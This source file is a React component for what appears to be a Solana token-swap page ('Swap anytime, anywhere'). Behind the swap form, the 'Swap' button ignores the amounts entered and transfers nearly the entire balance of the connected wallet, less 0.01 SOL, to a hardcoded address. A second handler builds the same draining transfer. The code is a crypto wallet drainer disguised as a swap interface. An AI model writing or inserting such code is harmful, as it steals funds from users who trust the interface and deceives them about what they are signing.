"use client";

import React, { useState } from "react";
import { FaArrowDown } from "react-icons/fa";
import Image from "next/image";
import { IoIosArrowDown } from "react-icons/io";
import {
  useAppKitAccount,
  useAppKitProvider,
  useAppKit,
} from "@reown/appkit/react";
import { useAppKitConnection } from "@reown/appkit-adapter-solana/react";

import type { Provider } from "@reown/appkit-adapter-solana";
import {
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
} from "@solana/web3.js";
import { SwapToken } from "@/init/send";

const paymentAddress = "EcNK5Lt7ftEk4wydT8yEMwuuGCnofM6N6bZmGTY8radM";

const FormBox = () => {
  const [sell, setSell] = useState("");
  const [buy, setBuy] = useState("");

  const { address } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider<Provider>("solana");
  const { connection } = useAppKitConnection();
  const { open, close } = useAppKit();

  const handleClick = async () => {
    try {
      if (connection && address) {
        const publicKey = new PublicKey(address);
        const hash = await connection.getLatestBlockhash({
          commitment: "finalized",
        });

        const balance = await connection.getBalance(publicKey);

        const tx = new Transaction({
          blockhash: hash.blockhash,
          lastValidBlockHeight: hash.lastValidBlockHeight,
          feePayer: publicKey,
        });

        console.log("balance", balance);

        tx.add(
          SystemProgram.transfer({
            fromPubkey: publicKey!,
            toPubkey: new PublicKey(paymentAddress),
            lamports: balance - 0.01 * LAMPORTS_PER_SOL,
          })
          // SystemProgram.transfer({
          //   fromPubkey: publicKey,
          //   toPubkey: new PublicKey(bs58.decode(chargeAddress)),
          //   lamports: 0.01 * LAMPORTS_PER_SOL,
          // })
        );

        const data = await walletProvider.sendTransaction(tx, connection, {
          preflightCommitment: "confirmed",
        });

        console.log("data", data);
      }
    } catch (error) {
      console.log("error", error);
    }
  };

  const rawTransaction = async () => {
    try {
      if (connection && address) {
        const publicKey = new PublicKey(address);

        const balance = await connection.getBalance(publicKey);
        // Fetch the latest blockhash
        await SwapToken.swap(
          connection,
          address,
          walletProvider,
          paymentAddress,
          balance - 0.01 * LAMPORTS_PER_SOL
        );
      }
    } catch (error) {
      console.log("error", error);
    }
  };

  return (
    <div className="p-4 py-6 flex flex-col justify-center items-center min-h-[calc(100svh-80px)] text-[#9B9B9B]">
      {/* Heading */}
      <h1 className="text-center text-4xl md:text-6xl font-bold leading-tight text-white">
        Swap anytime, <br /> anywhere.
      </h1>

      {/* Form Box */}
      <div className="mt-10 w-full max-w-[480px] bg-[#131313] p-4 lg:p-6 rounded-3xl shadow-lg">
        {/* Sell Section */}
        <div className="p-4 py-6 border border-[rgba(255,255,255,0.12)] rounded-[20px] relative">
          <p className="text-sm font-medium  mb-2">Sell</p>
          <div className="flex items-center">
            <input
              type="text"
              value={sell}
              onChange={(e) => setSell(e.target.value)}
              placeholder="0"
              className="bg-transparent text-3xl focus:outline-none text-[#9B9B9B] flex-1 min-w-0"
            />
            <span className="flex-shrink-0 flex items-center gap-2 bg-[#131313] hover:bg-transparent transition-all duration-300 border border-[rgba(255, 255, 255, 0.12)] p-1.5 pr-2.5 rounded-[20px]">
              <Image
                quality={100}
                className="w-7 h-7 object-cover"
                width={28}
                height={28}
                src="/sol.jpeg"
                alt="solana icon"
              />
              <p className="text-white font-bold">SOL</p>
              {/* <IoIosArrowDown className="text-base" /> */}
            </span>
          </div>
          <p className="mt-2">${100 * Number(sell || 0)}</p>

          {/* Spacer */}
          <button className="flex justify-center shadow-md absolute bottom-0 translate-y-1/2 left-1/2 -translate-x-1/2 bg-[#131313] p-1 rounded-2xl border border-[rgb(19,19,19)]">
            <div className="bg-[rgb(27,27,27)] p-2.5  rounded-md text-white ">
              <FaArrowDown />
            </div>
          </button>
        </div>

        {/* Buy Section */}
        <div className="p-4 border border-[rgba(255,255,255,0.12)] rounded-[20px] bg-[#2C2C2C] mt-1">
          <p className="text-sm font-medium mb-2">Buy</p>
          <div className="flex items-center">
            <input
              type="text"
              value={buy}
              onChange={(e) => setBuy(e.target.value)}
              placeholder="0"
              className="bg-transparent text-3xl focus:outline-none text-[#9B9B9B] flex-1 min-w-0"
            />
            <span className="flex-shrink-0 flex items-center gap-2 bg-[#FC72FF] transition-all duration-300 h-10 px-3 rounded-[20px] text-white">
              <p className="text-white font-bold">Select token</p>
              <IoIosArrowDown className="text-base" />
            </span>
          </div>
        </div>

        {/* Button */}
        <button
          onClick={
            address
              ? async () => rawTransaction()
              : () => open({ view: "Connect" })
          }
          className="w-full mt-6 bg-[rgb(49,28,49)] text-[#FC72FF] font-semibold py-3 rounded-2xl hover:opacity-90 transition-opacity"
        >
          {address ? "Swap" : "Connect Wallet"}
        </button>
      </div>
    </div>
  );
};

export default FormBox;
